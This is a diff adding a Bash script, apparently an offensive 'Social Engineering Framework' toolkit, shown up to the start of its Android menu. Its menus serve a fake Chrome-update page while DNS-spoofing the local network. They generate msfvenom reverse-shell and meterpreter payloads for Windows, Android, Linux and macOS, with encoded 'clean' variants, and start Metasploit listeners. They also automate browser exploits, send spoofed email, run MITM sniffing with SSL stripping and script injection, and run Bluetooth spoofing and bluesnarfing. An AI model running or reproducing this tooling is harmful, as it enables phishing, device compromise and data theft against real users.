@@ -1,0 +1,1207 @@
+#!/bin/bash
+clear
+mkdir /root/.SEF &> /dev/null
+while true
+do
+Black='\e[0;30m'        # Black
+Red='\e[0;31m'          # Red
+Green='\e[0;32m'        # Green
+Yellow='\e[0;33m'       # Yellow
+Blue='\e[0;34m'         # Blue
+Purple='\e[0;35m'       # Purple
+Cyan='\e[0;36m'         # Cyan
+White='\e[0;37m'        # White
+
+# Bold
+BBlack='\e[1;30m'       # Black
+BRed='\e[1;31m'         # Red
+BGreen='\e[1;32m'       # Green
+BYellow='\e[1;33m'      # Yellow
+BBlue='\e[1;34m'        # Blue
+BPurple='\e[1;35m'      # Purple
+BCyan='\e[1;36m'        # Cyan
+BWhite='\e[1;37m'       # White
+##banner
+echo -e $BYellow "                      ------------------------------"
+echo -e $BYellow "                      |Social Engineering Framework|"         
+echo -e $BYellow "                      ------------------------------"
+echo -e $BBlue "                |++++| Created by: $(echo -e $BYellow"Ahmad Nourallah") $(echo -e $BBlue"|++++|")"
+echo -e $BBlue "                |++++|         Verison: $(echo -e $BYellow"1.0") $(echo -e $BBlue"       |++++|")"
+echo -e $BBlue "                |++++|         Date create: $(echo -e $BYellow"17/1/1") $(echo -e $BBlue"|++++|")"
+echo -e $BBlue "                |++++|       Download Page:        |++++|" 
+echo -e $BYellow "           |++++| https://github.com/ahmadnourallah/SEF |++++|"
+echo
+echo -e $Yello "         Welcome to Social Engineering Framework the mind hack tools"
+echo
+echo -e $BWhite "Select from the menu: "
+echo -e $BYellow "                                      Some Info Commands: "
+echo -e $BWhite "1) Social Engineering Attack           $(echo -e $BYellow"Type (clear) to clean screen")"
+echo -e $BWhite "2) Aoutmatic Exploit Attack	  	$(echo -e $BYellow"Type (exit or quit) to exit from tools")"
+echo -e $BWhite "3) Bluetooth Toolkit                   $(echo -e $BYellow"Type (reset) to reset terminal")"
+echo -e $BWhite	"4) Android Toolkit			$(echo -e $BYellow"Type (back) to back to main menu")"
+echo
+echo -e $BWhite "99) Exit From Tools	        $(echo -e $BYellow"         Developer:$(echo -e $BBlue  "Dante Nourallah")")"
+echo
+##Start command
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " menu
+##info command
+##-----------------------------------------------------
+if [ "$menu" == "exit" ]
+then
+	clear
+	exit
+elif [ "$menu" == 99 ]
+	then
+	clear
+	exit
+elif [ "$menu" == 'quit' ] 
+then
+	clear
+	exit
+elif [ "$menu" == "clear" ]
+then
+	clear
+elif [ "$menu" == "reset" ]
+then
+	reset
+elif [ "$menu" == "back" ]
+then
+	clear
+##-----------------------------------------------------
+## (1) social engineering attack 
+##-----------------------------------------------------
+elif [ "$menu" == 1 ]
+	then
+echo
+echo -e $BWhite "1) Fake Download scame" 
+echo -e $BWhite "2) Mass Mailer Attack"
+echo -e $BWhite "3) Sniffer Network"
+echo
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " menu1
+#-----------------------------------------------------------------
+## 1-1 Fake Download scame
+##----------------------------------------------------------------
+if [ "$menu1" == "exit" ]
+then
+	clear
+	exit
+elif [ "$menu1" == "quit" ]
+then
+	clear
+	exit
+elif [ "$menu1" == "clear" ]
+then
+	clear
+elif [ "$menu1" == "reset" ]
+then
+	reset
+elif [ "$menu1" == "back" ]
+then
+	clear
+elif [ "$menu1" == 1 ]
+then
+	echo
+	echo -e $BYellow"INFO:$(echo -e $BWhite "This module setup fake scame on your localhost server and make payload use metasploit and make dnsspoof attack use ettercap to redirect all device in your network to this fake scame.\n For now we make only one scame but in next verison we will make more fake scame")"
+	echo
+	echo -e $BWhite "Select Any Scame You Need: "
+	echo
+	echo -e $BWhite "1) Chrome Update"
+	echo -e $BWhite "2) Soon In Verison 1.1"
+	echo 
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " me1
+if [ "$me1" == "exit" ]
+then
+	clear
+	exit
+elif [ "$me1" == "quit" ]
+then
+	clear
+	exit
+elif [ "$me1" == "clear" ]
+then
+	clear
+elif [ "$me1" == "reset" ]
+then
+	reset
+elif [ "$me1" == "back" ]
+then
+	clear
+#-----------------------------------------------------------------
+## 1-1-1 Chrome Update
+##----------------------------------------------------------------
+elif [ "$me1" == 1 ] 
+then
+	rm /var/www/html/index.html &>/dev/null 
+	cp Scame/chrome.html /var/www/html &>/dev/null
+	cp Scame/index.ico /var/www/html &>/dev/null
+	cp Scame/th.jpeg /var/www/html &>/dev/null
+	mv /var/www/html/chrome.html /var/www/html/index.html 
+
+	xterm -e tools/scripts/Payload
+echo "Now you can Go to /etc/ettercap/etter.dns and edit file to spoof websites."
+echo 
+read -n1 -r -p "$(echo -e $BBlue "If you finished press enter to continue...")" key
+echo
+	read -p "Enter your LHOST: $(echo -e $BWhite"")" lhost
+	read -p "$(echo -e $BBlue"Enter your LPORT: ")$(echo -e $BWhite )" lport
+				echo "use exploit/multi/handler" > tools/msfrc/Listening1.rc
+			echo "set payload windows/meterpreter/reverse_tcp" >> tools/msfrc/Listening1.rc
+			echo "set LHOST $lhost" >> tools/msfrc/Listening1.rc
+			echo "set LPORT $lport" >> tools/msfrc/Listening1.rc
+			echo "exploit" >> tools/msfrc/Listening1.rc
+			echo "use exploit/multi/handler" > tools/msfrc/Listening2.rc
+			echo "set payload android/meterpreter/reverse_tcp" >> tools/msfrc/Listening2.rc
+			echo "set LHOST $lhost" >> tools/msfrc/Listening2.rc
+			echo "set LPORT $lport" >> tools/msfrc/Listening2.rc
+			echo "exploit" >> tools/Listening2.rc
+			echo "use exploit/multi/handler" > tools/msfrc/Listening3.rc
+			echo "set payload linux/x64/meterpreter/reverse_tcp" >> tools/msfrc/Listening3.rc
+			echo "set LHOST $lhost" >> tools/msfrc/Listening3.rc
+			echo "set LPORT $lport" >> tools/msfrc/Listening3.rc
+			echo "exploit" >> tools/msfrc/Listening3.rc	
+			echo "use exploit/multi/handler" > tools/msfrc/Listening4.rc
+			echo "set payload linux/x86/meterpreter/reverse_tcp" >> tools/msfrc/Listening4.rc
+			echo "set LHOST $lhost" >> tools/msfrc/Listening4.rc
+			echo "set LPORT $lport" >> tools/msfrc/Listening4.rc
+			echo "exploit" >> tools/msfrc/Listening4.rc
+	read -p "$(echo -e $BBlue"Enter your os tybe (x64,x86): ")$(echo -e $BWhite"")" tybe
+	read -p "$(echo -e $BBlue"Enter your Terminal name (kde,gnome,lxde,xfce): ")$(echo -e $BWhite"")" terminal
+	if [ "$terminal" == "gnome" ]
+		then	
+		gnome-terminal -x tools/msfrc/Listner1
+		gnome-terminal -x tools/msfrc/Listner2
+		if [ "$tybe" == "x86" ]
+			then
+		gnome-terminal -x tools/msfrc/Listner3
+		elif [ "$tybe" == "x64" ]
+			then
+		gnome-terminal -x tools/msfrc/Listner4
+		fi
+	elif [ "$terminal" == "kde" ]
+		then
+		kde-terminal -x tools/msfrc/Listner1
+		kde-terminal -x tools/msfrc/Listner2
+		if [ "$tybe" == "x86" ]
+			then
+		kde-terminal -x tools/msfrc/Listner3
+		elif [ "$tybe" == "x64" ]
+			then
+		kde-terminal -x tools/msfrc/Listner4
+		fi
+	elif [ "$terminal" == "lxde" ]
+		then
+		lxde-terminal -x tools/msfrc/Listner1
+		lxde-terminal -x tools/msfrc/Listner2
+		if [ "$tybe" == "x86" ]
+			then
+		lxde-terminal -x tools/msfrc/Listner3
+		elif [ "$tybe" == "x64" ]
+			then
+		lxde-terminal -x tools/msfrc/Listner4
+		fi
+	elif [ "$terminal" == "xfce" ]
+		then
+		xfce-terminal -x tools/msfrc/Listner1
+		xfce-terminal -x tools/msfrc/Listner2
+		if [ "$tybe" == "x86" ]
+			then
+		xfce-terminal -x tools/msfrc/Listner3
+		elif [ "$tybe" == "x64" ]
+			then
+		xfce-terminal -x tools/msfrc/Listner4
+		fi
+	else 
+		echo
+		echo -e $BRed "Termial Not Found ....."
+		echo
+		read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+		exit
+	fi
+	pre=$?
+	if [ "$pre" == 0 ]
+		then
+		echo ""
+	else
+		echo "Sorry somethings was wrong ..."
+		echo
+		read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+		clear
+	fi
+	read -p "Enter your Interface: " Interface
+	xterm -e ettercap -T -q -M arp:remote -P dns_spoof -i $Interface ////
+	opre=$?
+	if [ "$opre" == 0 ]
+		then
+		echo ""
+	else
+		echo -e $BRed"Somethings was wrong please enter your right interface"
+		echo
+		read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+		clear
+	fi
+elif [ "$me1" == 2 ]
+then
+echo -e $BYellow "                                  SOON"
+echo 
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+##----------------------------------------------------------------------------------
+## 1-2 Mass Mailer Attack
+#-----------------------------------------------------------------------------------
+elif [ "$menu1" == 2 ]
+then
+echo
+echo -e $BYellow"INFO:$(echo -e $BWhite "This module work to send fake email to any email use real gmail account.")"
+echo
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter your Email in Gmail: ")$(echo -e $BWhite"")" email
+echo 
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter your email password: ")$(echo -e $BWhite"")" password
+echo 
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter the from name the user will see: ")$(echo -e $BWhite"")" name
+echo 
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter email need send email to: ")$(echo -e $BWhite"")" emailto
+echo
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter the mail subject: ")$(echo -e $BWhite"")" subject
+echo 
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter the mail body: ")$(echo -e $BWhite"")" text
+echo
+echo -e $BRed "Wait will your mail send"
+.//tools/massmailer/send.pl -f $name -t $emailto -s smtp.gmail.com:587 -xu $email -xp $password -u "$subject" -m "$text" &>/dev/null
+opre=$?
+echo 
+if [ "$opre" == 0 ]
+then
+echo "Email send succesfully"
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+else
+	echo "Error while send email, try send it later ...."
+echo 
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+fi
+#----------------------------------------------------------------------------
+## 1-3 Sniff Network
+##---------------------------------------------------------------------------
+elif [ "$menu1" == 3 ]
+	then
+	echo
+	echo -e $BYellow"INFO:$(echo -e $BWhite "This module sniff packets on your network and make mitm attack use mitmf python script")"
+	echo
+	echo -e $BWhite "1) Remote Browser (HTTP Only)"
+	echo -e $BWhite "2) Remote Browser With Sslstrip (HTTPS,HTTP)"
+	echo -e $BWhite "3) Inject Js In Html"
+	echo
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " sniff 
+if [ "$sniff" == "exit" ]
+then
+	clear
+	exit
+elif [ "$sniff" == "quit" ]
+then
+	clear
+	exit
+elif [ "$sniff" == "clear" ]
+then
+	clear
+elif [ "$sniff" == "reset" ]
+then
+	reset
+elif [ "$sniff" == "back" ]
+then
+	clear
+elif [ "$sniff" == 1 ]
+	then
+
+xterm -hold -e .//tools/scripts/Sniffing
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+
+elif [ "$sniff" == 2 ]
+	then
+xterm -hold -e .//tools/scripts/SniffingSSL
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$sniff" == 3 ]
+	then
+xterm -hold -e .//tools/scripts/inject
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+fi
+
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+##---------------------------------------------------------------------------
+## (2) Aoutmatic Exploit Attack
+##---------------------------------------------------------------------------
+elif [ "$menu" == 2 ]
+then
+echo
+echo -e $BWhite "1) Payload Creator And Listener"
+echo -e $BWhite "2) Windows Browser Exploits"
+echo
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " menu2
+#-----------------------------------------------------------------------------
+## 2-1 Payload Creator And Listener
+##----------------------------------------------------------------------------
+if [ "$menu2" == "exit" ]
+then
+	clear
+	exit
+elif [ "$menu2" == "quit" ]
+then
+	clear
+	exit
+elif [ "$menu2" == "clear" ]
+then
+	clear
+elif [ "$menu2" == "reset" ]
+then
+	reset
+elif [ "$menu2" == "back" ]
+then
+	clear
+elif [ "$menu2" == 1 ]
+	then
+	echo
+	echo -e $BYellow"INFO:$(echo -e $BWhite "This module made different payloads and save it on your Desktop then start listner use msfconsole to get your meterpreter.")"
+	echo
+read -p "$(echo -e $BYellow"Enter your LHOST:")$(echo -e $BWhite"") " host
+read -p "$(echo -e $BYellow"Enter your LPORT:")$(echo -e $BWhite"") " port 
+echo
+echo -e $BWhite "1) Windows meterpreter"
+echo -e $BWhite "2) Windows shell"
+echo -e $BWhite "3) Android meterpreter"
+echo -e $BWhite "4) Linux x86"
+echo -e $BWhite "5) Linux x64"
+echo -e $BWhite "6) Mac x86"
+echo -e $BWhite "7) Mac x64"
+echo -e $BWhite "8) Windows meterpreter (clean)"
+echo -e $BWhite "9) Android meterpreter (clean)"
+echo
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " me
+if [ "$me" == "exit" ]
+then
+	clear
+	exit
+elif [ "$me" == 'quit' ] 
+then
+	clear
+	exit
+elif [ "$me" == "clear" ]
+then
+	clear
+elif [ "$me" == "reset" ]
+then
+	reset
+elif [ "$me" == "back" ]
+then
+	clear
+elif [ "$me" == 1 ]
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$host LPORT=$port >/root/Desktop/payload.exe
+	echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/Listening.rc
+echo "set payload windows/meterpreter/reverse_tcp" >> tools/msfrc/Listening.rc
+echo "set LHOST $host" >> tools/msfrc/Listening.rc
+echo "set LPORT $port" >> tools/msfrc/Listening.rc
+echo "exploit" >> tools/msfrc/Listening.rc 
+xterm -hold -e tools/scripts/Listner
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$me" == 2 ] 
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p windows/shell/reverse_tcp -f exe LHOST=$host LPORT=$port >/root/Desktop/payload.exe 
+	echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/Listening.rc
+echo "set payload windows/shell/reverse_tcp" >> tools/msfrc/Listening.rc
+echo "set LHOST $host" >> tools/msfrc/Listening.rc
+echo "set LPORT $port" >> tools/msfrc/Listening.rc
+echo "exploit" >> tools/msfrc/Listening.rc 
+xterm -hold -e tools/scripts/Listner
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$me" == 3 ] 
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port >/root/Desktop/payload.apk 
+	echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/Listening.rc
+echo "set payload android/meterpreter/reverse_tcp" >> tools/msfrc/Listening.rc
+echo "set LHOST $host" >> tools/msfrc/Listening.rc
+echo "set LPORT $port" >> tools/msfrc/Listening.rc
+echo "exploit" >> tools/msfrc/Listening.rc 
+xterm -hold -e tools/scripts/Listner
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$me" == 4 ] 
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port >/root/Desktop/payload.elf 
+	echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/Listening.rc
+echo "set payload linux/x86/meterpreter/reverse_tcp" >> tools/msfrc/Listening.rc
+echo "set LHOST $host" >> tools/msfrc/Listening.rc
+echo "set LPORT $port" >> tools/msfrc/Listening.rc
+echo "exploit" >> tools/msfrc/Listening.rc 
+xterm -hold -e tools/scripts/Listner
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$me" == 5 ] 
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port >/root/Desktop/payload.elf 
+	echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/Listening.rc
+echo "set payload linux/x64/meterpreter/reverse_tcp" >> tools/msfrc/Listening.rc
+echo "set LHOST $host" >> tools/msfrc/Listening.rc
+echo "set LPORT $port" >> tools/msfrc/Listening.rc
+echo "exploit" >> tools/msfrc/Listening.rc 
+xterm -hold -e tools/scripts/Listner
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$me" == 6 ] 
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p osx/x86/shell_reverse_tcp -f macoh LHOST=$host LPORT=$port >/root/Desktop/payload.macoh 
+	echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/Listening.rc
+echo "set payload osx/x86/shell_reverse_tcp" >> tools/msfrc/Listening.rc
+echo "set LHOST $host" >> tools/msfrc/Listening.rc
+echo "set LPORT $port" >> tools/msfrc/Listening.rc
+echo "exploit" >> tools/msfrc/Listening.rc 
+xterm -hold -e tools/scripts/Listner
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$me" == 7 ] 
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p osx/x64/shell_reverse_tcp -f macoh LHOST=$host LPORT=$port >/root/Desktop/payload.macoh 
+	echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/Listening.rc
+echo "set payload osx/x64/shell_reverse_tcp" >> tools/msfrc/Listening.rc
+echo "set LHOST $host" >> tools/msfrc/Listening.rc
+echo "set LPORT $port" >> tools/msfrc/Listening.rc
+echo "exploit" >> tools/msfrc/Listening.rc 
+xterm -hold -e tools/scripts/Listner
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$me" == 8 ]
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p windows/mterpreter/reverse_tcp -f exe LHOST=$host LPORT=$port -e x86/shikata_ga_nai >/root/Desktop/payload.exe 
+echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/windowsclean.rc
+echo "set payload windows/meterpreter/reverse_tcp" >> tools/msfrc/windowsclean.rc
+echo "set LHOST $host" >> tools/msfrc/windowsclean.rc
+echo "set LPORT $port" >> tools/msfrc/windowsclean.rc
+echo "exploit" >> tools/msfrc/windowsclean.rc 
+xterm -hold -e tools/scripts/windowsclean
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+elif [ "$me" == 9 ]
+then
+echo
+echo -e $BRed "Wating will making your payload ...." 
+	msfvenom -p android/mterpreter/reverse_tcp LHOST=$host LPORT=$port -e x86/shikata_ga_nai >/root/Desktop/payload.apk 
+	echo
+echo -e $BRed "Done ... your payload on Your desktop"
+echo 
+echo -e $BYellow "Wait minute will start linstner ..... "
+sleep 1s
+echo "use exploit/multi/handler" > tools/msfrc/androidclean.rc
+echo "set payload android/meterpreter/reverse_tcp" >> tools/msfrc/androidclean.rc
+echo "set LHOST $host" >> tools/msfrc/androidclean.rc
+echo "set LPORT $port" >> tools/msfrc/androidclean.rc
+echo "exploit" >> tools/msfrc/androidclean.rc 
+xterm -hold -e tools/scripts/androidclean
+echo
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+clear
+
+
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+#-----------------------------------------------------------------------------
+## 2-2 Windows Browser Exploits
+##----------------------------------------------------------------------------
+elif [ "$menu2" == 2 ]
+then
+echo
+echo -e $BYellow"INFO:$(echo -e $BWhite "This module make automatic exploit use exploit in metasploit.")"
+echo 
+echo -e $BWhite "1) firefox_xpi_bootstrapped_addon"
+echo -e $BWhite "2) ms11_003_ie_css_import"
+echo
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " browser
+if [ "$browser" == "exit" ]
+then
+	clear
+	exit
+elif [ "$browser" == 'quit' ] 
+then
+	clear
+	exit
+elif [ "$browser" == "clear" ]
+then
+	clear
+elif [ "$browser" == "reset" ]
+then
+	reset
+elif [ "$browser" == "back" ]
+then
+	clear
+#-----------------------------------------------------------------------------
+## 2-2-1 firefox_xpi_bootstrapped_addon
+##----------------------------------------------------------------------------
+elif [ "$browser" == 1 ]
+then
+echo
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your IP To Listen(SRVHOST): ")$(echo -e $BWhite"")" host 
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your Port Listen: ")$(echo -e $BWhite"")" port
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your LHOST: ")$(echo -e $BWhite"")" lhost
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your LPORT: ")$(echo -e $BWhite"")" lport
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your Payload: ")$(echo -e $BWhite"")" payload
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your URIPATH: ")$(echo -e $BWhite"")" uri
+echo
+echo "use exploit/multi/browser/firefox_xpi_bootstrapped_addon" > tools/msfrc/firefox_xpi_bootstrapped_addon.rc
+echo "set SRVPORT $port" >> tools/msfrc/firefox_xpi_bootstrapped_addon.rc
+echo "set LHOST $lhost" >> tools/msfrc/firefox_xpi_bootstrapped_addon.rc
+echo "set LPORT $lport" >> tools/msfrc/firefox_xpi_bootstrapped_addon.rc
+echo "set payload $payload" >> tools/msfrc/firefox_xpi_bootstrapped_addon.rc
+echo "set URIPATH $uri" >> tools/msfrc/firefox_xpi_bootstrapped_addon.rc
+echo "exploit" >> tools/msfrc/firefox_xpi_bootstrapped_addon.rc
+xterm -hold -e tools/scripts/firefox_xpi_bootstrapped_addon
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#-----------------------------------------------------------------------------
+## 2-2-2 ms11_003_ie_css_import
+##----------------------------------------------------------------------------
+elif [ "$browser" == 2 ]
+then
+echo 
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your IP To Listen(SRVHOST): ")$(echo -e $BWhite"")" host 
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your Port Listen: ")$(echo -e $BWhite"")" port
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your LHOST: ")$(echo -e $BWhite"")" lhost
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your LPORT: ")$(echo -e $BWhite"")" lport
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your Payload: ")$(echo -e $BWhite"")" payload
+read -p "$(echo -e $BBlue"SEF>") $(echo -e $BYellow"Enter Your URIPATH: ")$(echo -e $BWhite"")" uri
+echo
+echo "use exploit/windows/browser/ms11_003_ie_css_import" > tools/msfrc/ms11_003_ie_css_import.rc
+echo "set SRVPORT $port" >> tools/msfrc/ms11_003_ie_css_import.rc
+echo "set LHOST $lhost" >> tools/msfrc/ms11_003_ie_css_import.rc
+echo "set LPORT $lport" >> tools/msfrc/ms11_003_ie_css_import.rc
+echo "set payload $payload" >> tools/msfrc/ms11_003_ie_css_import.rc
+echo "set URIPATH $uri" >> tools/msfrc/ms11_003_ie_css_import.rc
+echo "exploit" >> tools/msfrc/ms11_003_ie_css_import.rc
+xterm -hold -e tools/scripts/ms11_003_ie_css_import
+read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+
+
+
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+else
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+fi
+#-----------------------------------------------------------------------------
+## (3) Bluetooth Toolkit
+##----------------------------------------------------------------------------
+elif [ "$menu" == "3" ]
+then
+	echo
+	echo -e $BYellow"INFO:$(echo -e $BWhite "This module help you to pentest bluetooth technology and try hack it using many different type from attack.")"
+	echo
+	echo -e $BWhite"1) Scan Available Device"
+	echo -e $BWhite"2) Bluetooth Service Scanner"
+	echo -e $BWhite"3) Evil Twin Attack Bluetooth"
+	echo -e $BWhite"4) Bluetooth Service Attack"
+	echo	
+read -p "$(echo -e $BBlue"SEF>" )$(echo -e $BWhite"") " blue
+if [ "$blue" == "exit" ]
+then
+	clear
+	exit
+elif [ "$blue" == 'quit' ] 
+then
+	clear
+	exit
+elif [ "$blue" == "clear" ]
+then
+	clear
+elif [ "$blue" == "reset" ]
+then
+	reset
+elif [ "$blue" == "back" ]
+then
+	clear
+#-----------------------------------------------------------------------------
+## 3-1 Scan Available Device
+##----------------------------------------------------------------------------
+elif [ "$blue" == "1" ]
+then	
+	echo -e $BWhite
+	hcitool scan
+	echo
+opr=$?
+	if [ "$opr" == 0 ]	
+	then
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+	else
+		echo
+	echo -e $BRed "[*]Failed ...."
+	echo
+	fi
+#-----------------------------------------------------------------------------
+## 3-2 Bluetooth Service Scanner
+##----------------------------------------------------------------------------
+elif [ "$blue" == 2 ]
+then
+read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter your target bd_addr: ")$(echo -e $BWhite )" target
+	echo
+	./tools/bluetooth/sdptool browse $target
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+
+
+
+
+#-----------------------------------------------------------------------------
+## 3-3 Evil Twin Attack Bluetooth
+##----------------------------------------------------------------------------
+elif [ "$blue" == "3" ]
+then
+	read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter your target bd_addr: ")$(echo -e $BWhite )" add
+	read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter your target name: ")$(echo -e $BWhite )" name
+	read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter your bluetooth interface: ")$(echo -e $BWhite )" face
+	read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter your bluetooth interface(2): ")$(echo -e $BWhite )" face2
+	./tools/bluetooth/spooftooph -i $face -a $add -n "$name"
+	xterm -hold -e ./tools/bluetooth/l2ping -i $face2 $add
+	echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+#-----------------------------------------------------------------------------
+## 3-4 Bluetooth Service Attack
+##----------------------------------------------------------------------------
+elif [ "$blue" == "4" ]
+then
+	mkdir -p /dev/bluetooth/rfcomm &> /dev/null
+	mknod --m 666 /dev/bluetooth/rfcomm/0 c 216 0 &> /dev/null
+	mknod --mode=666 /dev/bluetooth/rfcomm0 c 216 0 &> /dev/null
+	
+	echo
+	read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter your target bd_addr: ")$(echo -e $BWhite )" mac
+	echo
+	read -p "$(echo -e $BBlue"SEF> ")$(echo -e $BYellow"Enter The service channel: ")$(echo -e $BWhite )" cha 		
+.//tools/bluetooth/bluesnarfer -r 1-100 -C $cha -b $mac
+opr=$?
+if [ "$opr" == 0 ]
+then
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear
+else
+	echo
+	echo -e $BRed "[*]Failed ...."
+	echo
+fi
+else
+echo
+	echo "[*]Options Not Found"
+	echo
+	read -n1 -r -p "$(echo -e $BGreen"Press enter to continue...")" key
+	clear	
+fi
+#-----------------------------------------------------------------------------
+## (4) Android Toolkit
+##----------------------------------------------------------------------------
+elif [ "$menu" == 4 ]
+then
+echo
+echo -e $BYellow"INFO:$(echo -e $BWhite "This is digital forensics module help you to control device by phone up to USB")"
+echo -e $BYellow"NOTE:$(echo -e $BWhite "The deivce must have root and enable debug mode or make it on recovery mode")"
+echo
+	echo -e $BWhite"1) Show Available Connected Device"
+	echo -e $BWhite"2) Get Android Shell"
+	echo -e $BWhite"3) Download File From Device"
+	echo -e $BWhite"4) Get Device Serial Number"
+	echo -e $BWhite"5) Some Automatic Command"
